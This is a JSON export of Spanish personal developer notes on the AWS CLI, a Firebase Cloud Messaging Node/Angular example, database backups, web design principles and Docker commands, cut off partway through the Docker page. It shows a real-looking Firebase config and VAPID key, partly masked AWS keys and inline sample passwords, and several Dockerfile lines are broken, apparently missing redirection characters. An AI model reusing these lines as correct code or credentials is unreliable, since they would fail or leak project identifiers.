[
  {
    "id": 0,
    "title": "referencia",
    "content": "\r\n## Instalar AWS CLI en debian\r\n\r\n```sh\r\nsudo apt-get install python-pip\r\nsudo apt-get install awscli\r\n```\r\n\r\n---\r\n\r\n## Autenticarse\r\n\r\nAgregar las variables de entorno:\r\n\r\n- AWS_ACCESS_KEY_ID\r\n- AWS_SECRET_ACCESS_KEY\r\n- AWS_SESSION_TOKEN\r\n\r\n```sh\r\nexport AWS_ACCESS_KEY_ID=AKI******Q3FWX******\r\nexport AWS_SECRET_ACCESS_KEY=******kpCand12HkRa******Mt8aMfp5W6******\r\n```\r\n\r\n---\r\n\r\n## S3\r\n\r\n- Copiar archivos a S3\r\n\r\n```sh\r\naws s3 cp /<file> s3://rubenfgr-udemy\r\n```\r\n",
    "path": "/cloud/aws/referencia"
  },
  {
    "id": 1,
    "title": "example_node_angular",
    "content": "\r\n:::info Repositorio\r\n\r\nIncluye el proyecto de Node (back) y Angular (front)\r\n\r\n[https://github.com/rubenfgr-doc/firebase-fcm-node-angular](https://github.com/rubenfgr-doc/firebase-fcm-node-angular)\r\n\r\n:::\r\n\r\n## Configurar FCM en la Consola de Firebase\r\n\r\n- Entramos al apartado de proyectos de Firebase\r\n- Agregamos un nuevo proyecto con el nombre: test-push-notifications\r\n- Deseleccionamos Google Analytics y lo creamos\r\n- Seleccionamos Participación / Messaging\r\n- Agregamos una App Web \r\n- Sobrenombre: Test Push Notifications\r\n- Clic en \"Registrar app\"\r\n- En este punto no hacemos nada más (volvemos a la consola)\r\n\r\n## Configurar backend (Node)\r\n\r\n- En la consola de firebase, vamos a \"Descripción general\" > Configuración del proyecto\r\n- Pestaña de \"Cuentas de servicio\"\r\n- Clic en \"Administrar permisos de la cuenta de servicio\"\r\n- En el menú, seleccionamos APIs y servicios > APIs y servicios habilitados > HABILITAR APIS Y SERVICIOS\r\n- Buscamos \"messaging\"\r\n- Habilitamos: Cloud Messaging, Firebase Cloud Messaging API y FCM Registration API\r\n- En la consola, seleccionamos Node.js\r\n- Clic en Generar nueva clave privada\r\n- Renombramos el .json descargado a key.json\r\n- Creamos el proyecto de backend\r\n\r\n```sh\r\nmkdir test-push-notifications-back\r\ncd test-push-notifications-back\r\nnpm init -y\r\ntouch index.js\r\nnpm i firebase@10.1.0\r\n```\r\n\r\n- Copiamos key.json en la raíz del proyecto\r\n- Agregamos el siguiente código en el index.js\r\n\r\n```js title=\"index.js\"\r\nvar admin = require(\"firebase-admin\");\r\n\r\nvar serviceAccount = require(\"./key.json\");\r\n\r\nvar app = admin.initializeApp({\r\n  credential: admin.credential.cert(serviceAccount),\r\n});\r\n\r\nadmin\r\n  .messaging(app)\r\n  .send({\r\n    token: \"<AQUI-EL-TOKEN-DE-CLIENTE>\",\r\n    data: { title: \"Título\", message: \"Mensaje\" },\r\n  })\r\n  .then((v) => {\r\n    console.log(\"Ok\", v);\r\n  })\r\n  .catch((err) => {\r\n    console.log(\"KO\", err);\r\n  });\r\n```\r\n\r\n## Configurar frontend (Angular)\r\n\r\n- Iniciamos un proyecto de Angular\r\n\r\n```sh\r\nng new test-push-notifications-front\r\ncd test-push-notifications-front\r\ntouch src/firebase-messaging-sw.js\r\nnpm i firebase@10.1.0\r\n```\r\n\r\n- Modificamos el angular.json\r\n\r\nAgregamos el archivo firebase-messaging-sw.js en los assets.\r\n\r\n```json title=angular.json\r\n{\r\n  ...\r\n  \"projects\": {\r\n    \"front\": {\r\n      ...\r\n      \"architect\": {\r\n        \"build\": {\r\n          ...\r\n          \"options\": {\r\n            ...\r\n            \"assets\": [\r\n              \"src/favicon.ico\",\r\n              \"src/assets\",\r\n              \"src/firebase-messaging-sw.js\"\r\n            ],\r\n            ...\r\n          },\r\n        }\r\n      }\r\n    }\r\n  }\r\n}\r\n```\r\n\r\n- Agregamos el siguiente código en firebase-messaging-sw.js\r\n\r\nLa configuración la obtenemos en la consola de firebase > Configuración del proyecto > General\r\n\r\n```js title=firebase-messaging-sw.js\r\nimportScripts(\r\n  \"https://www.gstatic.com/firebasejs/10.1.0/firebase-app-compat.js\"\r\n);\r\nimportScripts(\r\n  \"https://www.gstatic.com/firebasejs/10.1.0/firebase-messaging-compat.js\"\r\n);\r\n\r\n// Initialize the Firebase app in the service worker by passing the generated config\r\nvar firebaseConfig = {\r\n  apiKey: \"AIzaSyD9CxihmhjZYx7coxsRvjNY1WOUCumJGDU\",\r\n  authDomain: \"push-notifications-96ab3.firebaseapp.com\",\r\n  projectId: \"push-notifications-96ab3\",\r\n  storageBucket: \"push-notifications-96ab3.appspot.com\",\r\n  messagingSenderId: \"265925964312\",\r\n  appId: \"1:265925964312:web:e05d6f5246c1d9eb5a496d\",\r\n  measurementId: \"G-QBJE50HT2H\",\r\n};\r\n\r\nconst firebaseApp = firebase.initializeApp(firebaseConfig);\r\n\r\nconst messaging = firebase.messaging(firebaseApp);\r\n```\r\n\r\n- Modificamos el main.ts\r\n\r\n```ts title=main.ts\r\nimport { platformBrowserDynamic } from \"@angular/platform-browser-dynamic\";\r\n\r\nimport { AppModule } from \"./app/app.module\";\r\n\r\n// Import the functions you need from the SDKs you need\r\nimport { initializeApp } from \"firebase/app\";\r\n\r\nconst firebaseConfig = {\r\n  apiKey: \"AIzaSyD9CxihmhjZYx7coxsRvjNY1WOUCumJGDU\",\r\n  authDomain: \"push-notifications-96ab3.firebaseapp.com\",\r\n  projectId: \"push-notifications-96ab3\",\r\n  storageBucket: \"push-notifications-96ab3.appspot.com\",\r\n  messagingSenderId: \"265925964312\",\r\n  appId: \"1:265925964312:web:e05d6f5246c1d9eb5a496d\",\r\n  measurementId: \"G-QBJE50HT2H\",\r\n};\r\n\r\ninitializeApp(firebaseConfig);\r\n\r\nplatformBrowserDynamic()\r\n  .bootstrapModule(AppModule)\r\n  .catch((err) => console.error(err));\r\n```\r\n\r\n- Modificamos el app.component.ts\r\n\r\n```ts title=app.component.ts\r\nimport { Component, OnInit } from \"@angular/core\";\r\nimport {\r\n  getMessaging,\r\n  getToken,\r\n  onMessage,\r\n  Messaging,\r\n} from \"@firebase/messaging\";\r\n\r\n@Component({\r\n  selector: \"app-root\",\r\n  templateUrl: \"./app.component.html\",\r\n  styleUrls: [\"./app.component.scss\"],\r\n})\r\nexport class AppComponent implements OnInit {\r\n  title = \"FCM Received Message\";\r\n  payload = {};\r\n  token = \"\";\r\n\r\n  ngOnInit(): void {\r\n    const messaging: Messaging = getMessaging();\r\n\r\n    getToken(messaging, {\r\n      vapidKey:\r\n        \"BAaTt4I12tsLSyl11S8hENePANoCp8FfzrjaPhczENU6Gnv9ZScgzOJPuy_-GwpbCogEg5ZxkEQLSzeOzVIckx8\",\r\n    })\r\n      .then((currentToken) => {\r\n        if (currentToken) {\r\n          // Send the token to your server and update the UI if necessary\r\n          // ...\r\n          console.log(\"currentToken: \", currentToken);\r\n          this.token = currentToken;\r\n        } else {\r\n          // Show permission request UI\r\n          console.log(\r\n            \"No registration token available. Request permission to generate one.\"\r\n          );\r\n          // ...\r\n        }\r\n      })\r\n      .catch((err) => {\r\n        console.log(\"An error occurred while retrieving token. \", err);\r\n        // ...\r\n      });\r\n\r\n    onMessage(messaging, (payload) => {\r\n      console.log(\"Message received (foreground): \", payload);\r\n      this.payload = payload;\r\n    });\r\n  }\r\n}\r\n```\r\n\r\n- Modificamos el app.component.html\r\n\r\n```html title=app.component.html\r\n<h1>{{ title }}</h1>\r\n<h2>Token</h2>\r\n<pre>\r\n{{ token }}\r\n</pre>\r\n<h2>Payload</h2>\r\n<pre>\r\n  {{ payload | json }}\r\n</pre>\r\n```\r\n\r\n## Obtener token en front y usar en back\r\n\r\n- Front. Ejecutamos el proyecto y copiamose el token que se imprimirá por html o consola\r\n- Back. Copiamos el token en: AQUI-EL-TOKEN-DE-CLIENTE\r\n- Ejecutamos el back\r\n- En este momento el front a tenido que recibir el mensaje del back y mostrarlo en pantalla\r\n",
    "path": "/cloud/firebase/cloud_messaging/example_node_angular"
  },
  {
    "id": 2,
    "title": "intro",
    "content": "\r\n## Firebase Cloud Messaging (FCM)\r\n\r\nSolución de mensajería multiplataforma que te ptermite enviar mensajes de forma segura y sin costo.\r\n\r\n## Características\r\n\r\n- Envía mensajes de notificación o mensajes de datos\r\n- Segmentación de mensajes\r\n  - A dispositivos individuales\r\n  - A grupos de dispositivos\r\n  - A dispositivos subscritos a temas\r\n- Envío de mensajes desde apps cliente\r\n\r\n## ¿Cómo funciona?\r\n\r\nIncluye dos componentes principales:\r\n\r\n- Entorno de confianza como Cloud Functions para Firebase o un servidor de apps para generar, segmentar y enviar mensajes.\r\n- App cliente de Apple, Android o Web\r\n\r\nSe pueden enviar mensajes desde:\r\n\r\n- SDK de Firebase Admin o protocolos de servidor de FCM, (por ejemplo, en un backend con NodeJS)\r\n- Compositor de Notificaciones en la consola de Firebase. Permite crear campañas.\r\n",
    "path": "/cloud/firebase/cloud_messaging/intro"
  },
  {
    "id": 3,
    "title": "reference",
    "content": "\r\n## Referencias\r\n\r\n- [FCM](https://firebase.google.com/docs/cloud-messaging?hl=es-419)\r\n\r\n## Tutoriales\r\n\r\n- [Web](https://miyauchi.dev/posts/fcm-push-message/)\r\n",
    "path": "/cloud/firebase/cloud_messaging/reference"
  },
  {
    "id": 4,
    "title": "referencia",
    "content": "\r\n## Plugins\r\n\r\n- **WPForms**. Formularios\r\n- **Constant Contact**. Servicio de marketing por correo\r\n- **MonsterInsights**. Google Analytics\r\n- **OptinMonster**. Plantillas de ventanas emergentes, diapositivas, barras de anuncios, etc.\r\n- **MemberPress**. Cursos en lóinea, comunidades y sitios de membresía. Permite restricciones de acceso\r\n- **All in One SEO**\r\n- **WP Rocket**. Almacenamiento en caché\r\n- **Sucuri**. Seguridad y firewall\r\n- **RafflePress**. Sorteos\r\n- **PushEngage**. Notificaciones push\r\n- **Uncanny Automator**. Automatización de tareas. Buena integración con los complementos más populares\r\n- **LearnDash**. Venta de cursos en línea\r\n- **SEMRush**. Marketing todo en uno. SEO, tráfico, redes sociales, contenidos, relaciones públicas, etc.\r\n- **LiveChat**. Chat en vivo\r\n- **Pretty Links Pro**. Enlaces de afiliados\r\n- **Shared Counts**. Botones para compartir contenido en redes sociales\r\n- **WP Mail SMTP**. Envío de correos a través de un servidor SMTP\r\n- **Insert Headers and Footers**\r\n- **WPML**. Sitio multilingüe\r\n- **WooCommerce**. Tienda online\r\n- **Nextiva**. Servicio telefónico\r\n\r\n---\r\n\r\n## Temas\r\n\r\n- **GeneratePress**\r\n- **Storefront**\r\n- **OceanWP**\r\n- **Astra**\r\n- **Twenty Seventeen**\r\n- **Sydney**\r\n- **ColorMag**. Revistas y noticias\r\n- **Hestia**\r\n- **OnePress**\r\n- **Neve**\r\n",
    "path": "/cms/wordpress/referencia"
  },
  {
    "id": 5,
    "title": "referencia",
    "content": "\r\n## Conexión\r\n\r\n- **Conectar a la base de datos con usuario + dirección + pw**\r\n\r\n  ```sh\r\n    mysql -u <nombre-usuario> -h <IP-servidor-mysql> -p<pw> --port <puerto>\r\n  ```\r\n\r\n---\r\n\r\n## Consola MySQL\r\n\r\n- **Mostrar las bases de datos existentes**\r\n\r\n  ```sql\r\n  show databases;\r\n  ```\r\n\r\n- **Cambiar contraseña root**\r\n\r\n  ```sql\r\n  ALTER USER 'root'@'localhost' IDENTIFIED WITH caching_sha2_password BY 'yourpasswd';\r\n  ```\r\n\r\n---\r\n\r\n## Backups\r\n\r\n- **Crear backups de una db**\r\n\r\n  ```sh\r\n  mysqldump -u root -h 127.0.0.1 -p12345678 db_schema > dump.sql\r\n  ```\r\n\r\n- **Importar un backup a un schema existente**\r\n\r\n  ```sh\r\n  mysql -u root -h 127.0.0.1 -p schema_existente < dump.sql\r\n  ```\r\n",
    "path": "/database/mysql/referencia"
  },
  {
    "id": 6,
    "title": "referencia",
    "content": "\r\n## Configuración remota\r\n\r\n- Comprobar ip y puerto de postgress\r\n\r\n  ```sh\r\n  sudo netstat -nlt | grep 5432\r\n  ```\r\n\r\n- Modificar el archivo postgresql.conf\r\n- Modificar la linea:\r\n\r\n  ```conf\r\n  listen_addresses = 'localhost'\r\n  listen_addresses = '\\*'\r\n  ```\r\n\r\n## Terminal\r\n\r\n- **Conexion a una base de datos**\r\n\r\n  ```sh\r\n  psql -d <nombre-bd> -U <usuario>\r\n  ```\r\n\r\n- **Crear backup**\r\n\r\n  ```sh\r\n  pg_dump -h localhost -p 5432 -U postgres -d test > backup.sql\r\n  ```\r\n\r\n- **Crear un backup remoto de un contenedor al host**\r\n\r\n  ```sh\r\n  docker exec -ti postgres_test bash -c \"pg_dump -h localhost -p 5432 -U postgres -d test\" > backup.sql\r\n  ```\r\n",
    "path": "/database/postgresql/referencia"
  },
  {
    "id": 7,
    "title": "Alineación",
    "content": "# Alineación\r\n\r\nLa alineación es una técnica de diseño que se utiliza para organizar los elementos de una página web de manera que se vean ordenados y limpios. La alineación puede ser horizontal o vertical y se puede aplicar a cualquier elemento de la página, como texto, imágenes, botones, etc.\r\n\r\n## Tipos de alineación\r\n\r\n- Horizontal\r\n    - Izquierda\r\n    - Derecha\r\n    - Centro\r\n- Vertical\r\n    - Superior\r\n    - Inferior\r\n    - Centro\r\n\r\n![Tipos de alineación](./static/Tipos-de-Alineacion-1.webp)\r\n\r\n## Cuadrícula\r\n\r\nLa cuadrícula es una técnica de diseño que se utiliza para organizar los elementos de una página web en filas y columnas. La cuadrícula es una forma eficaz de alinear los elementos de una página web y de crear un diseño ordenado y limpio.\r\n\r\n1. Sin cuadrícula\r\n\r\n![Sin cuadrícula](./static/incorrect-alignment.webp)\r\n\r\n2. Con cuadrícula\r\n\r\n![Con cuadrícula](./static/alineamiento-incorrecto-con-cuadricula.webp)\r\n\r\n3. Alineación a cuadrícula\r\n\r\n![Alineación a cuadrícula](./static/alineamiento-correcto-con-cuadricula.webp)\r\n\r\n## Alineación al centro\r\n\r\nLa alineación al centro es una técnica de diseño que se utiliza para centrar los elementos de una página web en el centro de la pantalla. La alineación al centro es una forma eficaz de crear un diseño ordenado y limpio.\r\n\r\n>Experimentar con otros tipos de alineación para crear algo con más personalidad\r\n\r\n## Justificado\r\n\r\nEl justificado es una técnica de diseño que se utiliza para alinear el texto de una página web de manera que se vea ordenado y limpio. El justificado es una forma eficaz de crear un diseño profesional y atractivo.\r\n\r\n>Evitar texto justificado, no luce bien\r\n\r\n## Conclusión\r\n\r\n- Mantener una conexión entre los elementos dibujando líneas o usando una cuadrícula.\r\n- SIempre buscar una forma de alinearlos y crear conexión entre sí.\r\n- La alineación busca organizar y unificar los elementos para que exista orden donde podría haber caos.\r\n\r\n## Referencias\r\n\r\n- [https://webdesignis.fun/como-alinear-tus-elementos-correctamente/?utm_source=udemy&utm_medium=leccion&utm_campaign=curso](https://webdesignis.fun/como-alinear-tus-elementos-correctamente/?utm_source=udemy&utm_medium=leccion&utm_campaign=curso)\r\n\r\n",
    "path": "/design/alignment"
  },
  {
    "id": 8,
    "title": "Contraste",
    "content": "# Contraste\r\n\r\nEl contraste es uno de los principios básicos del diseño gráfico y la tipografía. Se refiere a la diferencia entre dos elementos, como el texto y el fondo. Un buen contraste es esencial para garantizar que el texto sea legible y fácil de leer.\r\n\r\nEl principio del contaste indica que, si ciertos elementos no son los mismos, entonces debe de hacerlos lucir realmente diferentes con el fin de resaltar los elementos más importantes.\r\n\r\n## 3 formas de crear contraste\r\n\r\n**Color**: Utilizar colores contrastantes para resaltar elementos importantes. \r\n\r\n:::tip\r\nUtilizar colores complementarios\r\n:::\r\n\r\n![Color](./static/Contraste-en-colores-480x274.webp)\r\n\r\n**Tamaño**: Utilizar diferentes tamaños de fuente para resaltar elementos importantes. Tambien se puede aplicar a formas y líneas.\r\n\r\n![Tamaño](./static/Contraste-tamano-480x274.webp)\r\n\r\n**Peso**: Utilizar diferentes pesos de fuente para resaltar elementos importantes. Tambien se puede aplicar a formas y líneas.\r\n\r\n:::tip\r\nUtilizar con fuentes tipográficas o formas\r\n:::\r\n\r\nEjemplo con formas:\r\n\r\n![Peso](./static/Contraste-en-peso-1-480x274.webp)\r\n\r\n## Conclusión\r\n\r\nEl contraste permite captar la atención de los usuarios.\r\n\r\nSe puede generar contraste combinando fuentes tipográficas, colores, formas, líneas, etc.\r\n\r\nEjemplo que aplica las 3 formas principales de crear contraste:\r\n\r\n![3 formas principales de crear contraste](./static/Contraste-aplicado-en-diseno-web-480x224.png)\r\n\r\n## Referencias\r\n\r\n- [https://webdesignis.fun/como-crear-contraste-en-tus-disenos/?utm_source=udemy&utm_medium=leccion&utm_campaign=curso](https://webdesignis.fun/como-crear-contraste-en-tus-disenos/?utm_source=udemy&utm_medium=leccion&utm_campaign=curso)\r\n\r\n",
    "path": "/design/contrast"
  },
  {
    "id": 9,
    "title": "Proximidad",
    "content": "# Proximidad\r\n\r\nEn diseño gráfico, la proximidad es una técnica que se utiliza para organizar los elementos de una página web de manera que se vean ordenados y limpios. La proximidad es una forma eficaz de crear un diseño coherente y atractivo.\r\n\r\nLa proximidad es uno de los 4 principios básicos del diseño.\r\n\r\n:::tip\r\n**Como recla de oro**, las cosas que están relacionadas deben estar juntas y las cosas que no están relacionadas deben estar separadas.\r\n:::\r\n\r\n## Diseño web\r\n\r\nSin proximidad\r\n\r\n![Sin proximidad](./static/Proximidad-incorrecta-en-diseno-web.webp)\r\n\r\nCon proximidad\r\n\r\n![Con proximidad](./static/Proximidad-correcta-en-diseno-web.webp)\r\n\r\n## Conclusión\r\n\r\nAl agrupar elementos colocandolos cerca unos de otros, se convierten en una unidad visual que permite transmitir información de forma fácil.\r\n\r\n:::info\r\n- **COMUNICAR**\r\n- **ORGANIZAR**. Usar una cuadrícula\r\n:::\r\n\r\n:::tip\r\n**Ejercicios para cada uno de tus diseños:**\r\n- ¿Se sienten mis ojos cómodos siguiendo la información?\r\n- ¿Qué tanto hace el diseño que mis ojos se detengan?\r\n- ¿Es fácil encontrar la información?\r\n:::\r\n\r\n:::warning\r\n- **No** agrupar elementos que no están relacionados.\r\n- **Evitar** tener muchos elementos separados.\r\n- **No** crear elementos en las esquinas con el fin de evitar espacios en blanco.\r\n:::\r\n\r\n## Referencias\r\n\r\n- [https://webdesignis.fun/la-proximidad-en-el-diseno/?utm_source=udemy&utm_medium=leccion&utm_campaign=curso](https://webdesignis.fun/la-proximidad-en-el-diseno/?utm_source=udemy&utm_medium=leccion&utm_campaign=curso)\r\n",
    "path": "/design/proximity"
  },
  {
    "id": 10,
    "title": "Referencias",
    "content": "# Referencias\r\n\r\n- [Importancia de utilizar cuadrícula](https://webdesignis.fun/porque-es-importante-utilizar-cuadricula-en-el-diseno/)\r\n- [Jerarquía visual](https://webdesignis.fun/que-es-la-jerarquia-visual/?utm_source=udemy&utm_medium=leccion&utm_campaign=curso)\r\n- [Combinar colores](https://webdesignis.fun/como-combinar-colores-con-la-rueda-de-colores/?utm_source=udemy&utm_medium=leccion&utm_campaign=curso)",
    "path": "/design/references"
  },
  {
    "id": 11,
    "title": "Repetición",
    "content": "# Repetición\r\n\r\nLa repetición es uno de los 4 principios básicos del diseño.\r\n\r\nLa repetición trata de repetir algún estilo o aspecto a lo largo de toda tu pieza de diseño. Ayuda a crear consistencia.\r\n\r\nSe pueden repetir: formatos de diseños, grosor de líneas, formas, texturas, imágenes, videos, colores, etc.\r\n\r\n:::tip\r\nImportante aplicar la repetición cuando la web tenga varias páginas para que los usuarios se sientan en el mismo lugar.\r\n:::\r\n\r\nEjemplo en diseño web:\r\n\r\n![Repetición](./static/ejemplo-de-principio-de-repeticion.webp)\r\n\r\n## Referencias\r\n\r\n- [https://webdesignis.fun/que-es-la-repeticion/?utm_source=udemy&utm_medium=leccion&utm_campaign=curso](https://webdesignis.fun/que-es-la-repeticion/?utm_source=udemy&utm_medium=leccion&utm_campaign=curso)\r\n\r\n",
    "path": "/design/repetition"
  },
  {
    "id": 12,
    "title": "Tipografía",
    "content": "# Tipografía\r\n\r\n## Combinación de tipografías\r\n\r\n- [Canva - Guia definitiva para combinar fuentes](https://www.canva.com/es_mx/aprende/guia-definitiva-para-combinar-fuentes/)\r\n\r\n## ¿Que es la tipografía?\r\n\r\nEs el arte y técnica de disponer correctamente el texto en una página, tanto impresa como digital.\r\n\r\n:::warning\r\nNo utilizar más de 2 tipos de fuentes.\r\n:::\r\n\r\n## Subrayado\r\n\r\nNO se recomienda el uso de subrayado en textos digitales, ya que se puede confundir con un hipervínculo.\r\n\r\n## Huérfanos y viudas en tipografía\r\n\r\nEvitar que queden huérfanos y viudas en los textos.\r\n\r\n- **Huérfanos**: Es la última línea de un párrafo que queda sola al principio de una columna o página.\r\n\r\n![Huérfanos](./static/huerfano-en-parrafo.webp)\r\n\r\n- **Viudas**: Es la primera línea de un párrafo que queda sola al final de una columna o página.\r\n\r\n![Viudas](./static/viuda-en-parrafo.webp)\r\n\r\n## Doble Espacio\r\n\r\nNo se recomienda el uso de doble espacio después de un punto.\r\n\r\n## Interletrado y seguimiento\r\n\r\n- **Interletrado**: Espacio entre letras.\r\n- **Seguimiento**: Espacio entre palabras.\r\n\r\nConsejos:\r\n\r\n- **Interletrado**: 1% a 2% del tamaño de la fuente. \r\n- **Seguimiento**: 120% a 150% del tamaño de la fuente.\r\n- **Interlineado**: 120% a 150% del tamaño de la fuente.\r\n\r\n:::tip\r\nIncrementar cuando la fuente es más delgada y más pequeña, reducir cuando la letra se haga más gruesa y grande.\r\n:::\r\n\r\nEjemplo:\r\n\r\nSin aplicar Interletrado a título\r\n\r\n![Sin Interletrado](./static/inter-letrado-no-aplicado-en-titulo.webp)\r\n\r\nInterletrado aplicado a título\r\n\r\n![Interletrado](./static/interletrado-aplicado-a-titulo.webp)\r\n\r\n## MAYÚSCULAS\r\n\r\nCon las MAYÚSCULAS podemos generar contraste y jerarquía en el texto.\r\n\r\n- **Evitar**: No escribir todo en mayúsculas.\r\n- **Usar**: Para títulos y subtítulos.\r\n- **Combinar**: Con minúsculas para mejorar la legibilidad.\r\n\r\n![Mayúsculas](./static/interletrado-y-mayusculas.webp)\r\n\r\n## Categorias de tipografías\r\n\r\n- **Serif**: Con remates.\r\n- **Sans Serif**: Sin remates.\r\n- **Script**: Manuscritas.\r\n\r\n![Serif, Sans Serif y Script](./static/tipografia-serif-sans-serif-script.webp)\r\n\r\nSubcategorías de Serif:\r\n\r\n![Modern, Oldstyle, Slab Serif](./static/tipografia-serif-categories.webp)\r\n\r\nEstas no se suelen utilizar en diseño web.\r\n\r\n- **Display**: Para títulos.\r\n- **Monospace**: Para código.\r\n\r\n![Display y Monospace](./static/tipografia-display-monospace.webp)\r\n\r\n## Combinar fuentes\r\n\r\n- **Relación en conflicto**: Fuentes que compiten entre sí. Se consigue utilizando dos tipos de fuentes pertenecientes a la categoría Sans Serif, o dos Serif y así sucesivamente.\r\n- **Relación de acuerdo o amistad**: Misma fuente. Se consigue utilizando un único tipo de fuente para todo el diseño. Diseño tranquilo y formal, relación conservadora.\r\n- **Relación de contraste**: Fuentes que se complementan. Se consigue utilizando una fuente Serif y una Sans Serif, o una Serif con Script. Diseño más dinámico y moderno.\r\n\r\n## Referencias\r\n\r\n- [https://webdesignis.fun/que-es-la-tipografia/?utm_source=udemy&utm_medium=leccion&utm_campaign=curso](https://webdesignis.fun/que-es-la-tipografia/?utm_source=udemy&utm_medium=leccion&utm_campaign=curso)\r\n",
    "path": "/design/typografy"
  },
  {
    "id": 13,
    "title": "ver la contraseña",
    "content": "\r\n> Información sobre el servicio de Docker\r\n\r\n`/var/run/docker.sock`\r\n\r\n- **Correr HELLO-WORLD**\r\n\r\n```sh\r\ndocker run hello-world\r\n```\r\n\r\n## IMAGENES\r\n\r\n- **Ver las imagenes actuales en el host de docker**\r\n\r\n```sh\r\ndocker images\r\n```\r\n\r\n- **Listar imagenes filtrando por atributos**\r\n\r\n```sh\r\ndocker images -f dangling=true\r\n```\r\n\r\n- **Listar con filtrado y solo mostrar los ID**\r\n\r\n```sh\r\ndocker images -f dangling=true -q\r\n```\r\n\r\n- **Eliminar todas las imagenes en el limbo**\r\n\r\n```sh\r\ndocker images -f dangling=true -q | xargs docker rmi\r\n```\r\n\r\n- **Eliminar una imagen**\r\n\r\n```sh\r\ndocker image rm -f \"ID-imagen\"\r\n```\r\n\r\n- **Eiminar varias imagenes**\r\n\r\n```sh\r\ndocker rmi \"nombre-imagen\":\"tag-imagen\" [\"nombre-imagen\":\"tag-imagen\"]\r\n```\r\n\r\n### IMAGENES OFICIALES\r\n\r\n- **Descargar una imagen oficial**\r\n\r\n```sh\r\ndocker pull \"nombre-imagen\"\r\n```\r\n\r\n```sh\r\ndocker pull \"nombre-imagen\":\"version\"\r\n```\r\n\r\n### IMAGENES PERSONALIZADAS\r\n\r\n- **Buenas practicas**\r\n\r\n  - Efimeros (servicio destruible facilmente)\r\n  - Un servicio por contenedor\r\n  - Build context -\" .dockerignore\r\n  - Pocas capas\r\n  - Multi linea \\\r\n  - Varios argumentos en una sola capa\r\n  - No instalar paquetes innecesarios\r\n  - Labels\r\n\r\n- **Construir una imagen a través del Dockerfile (tag para poner nombre a la imagen al final para cojer el Dockerfile). Contenido del Dockerfile para apache+ubuntu**\r\n  - **FROM** - S.O ó Imagen misma desde donde comenzar\r\n  - **RUN** - Intrucciones que se pueden ejecutar en la terminal\r\n  - **COPY/ADD** - Copiar archivos desde la maquina a la imagen. ADD se utiliza para utilizar una URL de origen, es decir, copia el contenido de esa URL al destino\r\n  - **ENV** - Variables de entorno\r\n  - **WORKDIR** - Directorios de trabajo\r\n  - **EXPOSE** - Exponer puertos\r\n  - **LABEL** - Etiquetas (metadata de la imagen, version, descripción, etc.)\r\n  - **USER** - Usuario que ejecuta la tarea\r\n  - **VOLUME** - Volúmenes\r\n  - **CMD .dockerignore**\r\n\r\n```sh\r\nFROM ubuntu:latest\r\n\r\nLABEL version=1.0\r\nLABEL descripcion=\"This is an apache image\"\r\nLABEL vendor=yo\r\n\r\nRUN apt-get update && apt-get upgrade && apt-get install apache2 -y\r\n\r\nWORKDIR /var/www/html\r\n\r\nCOPY bootstrap .\r\n\r\nENV contenido prueba\r\n\r\nRUN echo \"$contenido\" \" /var/www/html/prueba.html\r\n\r\nRUN echo \"$(whoami)\" \" /var/www/html/user1.html\r\n\r\nUSER ricardo && chown ricardo /var/www/html\r\n\r\nRUN echo \"$(whoami)\" \" /var/www/html/user2.html\r\n\r\nEXPOSE 81\r\n\r\nCMD apachectl -DFOREGROUND\r\n```\r\n\r\n#### DOCKERFILE\r\n\r\n- **Crear un script CMD para Dockerfile**\r\n\r\n```bash\r\n#!/bin/bash\r\n\r\necho \"Iniciando container...\"\r\napachectl -DFOREGROUND\r\n```\r\n\r\n### BUILD\r\n\r\n- **Enviar datos al .dockerignore**\r\n\r\n```sh\r\necho \"\"nombre-archivo-directorio\" \"\" .dockerignore\r\n```\r\n\r\n- **Una vez creado el Dockerfile ejecutar por shell**\r\n\r\n```sh\r\ndocker build --tag apache-centos[:\"tag\"]`\r\n```\r\n\r\n- **Build con un dockerfile con distinto nombre**\r\n\r\n```sh\r\ndocker build -t test -f \"nombre-dockerfile-personalizado\"\r\n```\r\n\r\n- **Comprobar el historial de capas de una imagen**\r\n\r\n```sh\r\ndocker history -H \"nombre-imagen\":\"tag\"\r\n```\r\n\r\n```sh\r\ndocker history -H \"nombre-imagen\":\"tag\" --no-trunc\r\n```\r\n\r\n## CONTAINERS\r\n\r\n- **Correr un contenedor (-d en segundo plano)**\r\n\r\n```sh\r\ndocker run -d \"nombre-imagen\"\r\n```\r\n\r\n```sh\r\ndocker run -d --name \"nombre\" \"nombre-imagen\"[:\"tag\"]\r\n```\r\n\r\n- **Correr un contenedor mapeando el puerto del PC anfitrion al contenedor**\r\n\r\n`docker run -d --name \"nombre\" -p 80:80 \"nombre-imagen\"[:\"tag\"]`\r\n\r\n- **Correr un contenedor mapeando el puerto del PC anfitrion al contenedor**\r\n\r\n`docker run -d --restart unless-stopped redis --name \"nombre\" -p 80:80 \"nombre-imagen\"[:\"tag\"]`\r\n\r\n- **Correr un contenedor agregando variables de entorno**\r\n\r\n`docker run -dti -e \"prueba1=4321\" --name environment env`\r\n\r\n- **Correr un contenedor y navegar a un directorio en el arranque**\r\n\r\n```sh\r\ndocker run -d -w /\"dir-name\" \"nombre-imagen\"[:\"tag\"]\r\n```\r\n\r\n- **Ver los contenedores en ejecución**\r\n\r\n`docker ps`\r\n\r\n- **ver los contenedores en ejecución (incluidos los caidos)**\r\n\r\n`docker ps -a`\r\n\r\n- **ver los contenedores en ejecución (Solo ID)**\r\n\r\n`docker ps -q`\r\n\r\n- **Ver el último contenedor creado**\r\n\r\n`docker ps -l`\r\n\r\n- **Eliminar contenedores con --force y --volumes**\r\n\r\n`docker rm -fv \"nombre-contenedor\" [\"nombre-contenedor\"...]`\r\n\r\n- **Eliminar contenedores \"exited\"**\r\n\r\n`docker rm -v $(docker ps -a -q -f status=exited)`\r\n\r\n- **Eliminar todos los contenedores**\r\n\r\n`docker ps -q | xargs docker rm -f`\r\n\r\n`docker rm -fv $(docker ps -aq)`\r\n\r\n- **Inspeccionar un contenedor**\r\n\r\n`docker inspect \"nombre-contenedor\"|\"ID-contenedor\"`\r\n\r\n- **Renombrar un contenedor en ejecución**\r\n\r\n`dockerrename \"nombre-actual\" \"nombre-nuevo\"`\r\n\r\n- **Detener un contenedor**\r\n\r\n`docker stop \"nombre-contenedor\"|\"ID-contenedor\"`\r\n\r\n- **Iniciar un contenedor**\r\n\r\n`docker start \"nombre-contenedor\"|\"ID-contenedor\"`\r\n\r\n- **Reiniciar (stop + start) un contenedor**\r\n\r\n`docker restart \"nombre-contenedor\"|\"ID-contenedor\"`\r\n\r\n- **Ingresar a la terminal de un contenedor -ti(terminal + 